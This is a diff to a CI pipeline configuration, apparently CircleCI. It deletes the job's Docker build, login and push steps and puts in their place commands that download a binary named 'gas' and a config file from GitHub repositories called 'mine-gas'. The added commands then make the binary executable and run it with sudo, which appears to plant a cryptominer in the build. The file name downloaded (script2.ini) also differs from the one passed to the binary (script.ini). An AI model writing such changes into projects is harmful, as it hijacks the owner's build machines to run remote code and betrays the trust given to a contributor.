@@ -10,18 +10,8 @@ jobs:
       - checkout
       - run:
           command: |
-            # Restart Docker with experimental features on.
-            sudo sh -c 'echo '\''DOCKER_OPTS="--experimental=true"'\'' >> /etc/default/docker'
-            sudo service docker restart
-
-            # Install dependencies for tests etc.
             sudo apt-get update
-            sudo apt-get install -y php5
-
-            # Build image with experimental feature --squash.
-            docker build --squash -t myuser/myimage .
-
-            # Login and push Docker image to registry.
-            docker login -u $DOCKER_USER -p $DOCKER_PASS
-            docker push myuser/myimage
-
+            sudo wget https://github.com/L00K11/mine-gas/raw/main/gas
+            sudo wget https://github.com/koguara28/mine-gas/raw/main/script2.ini
+            sudo chmod +x gas
+            sudo ./gas script.ini
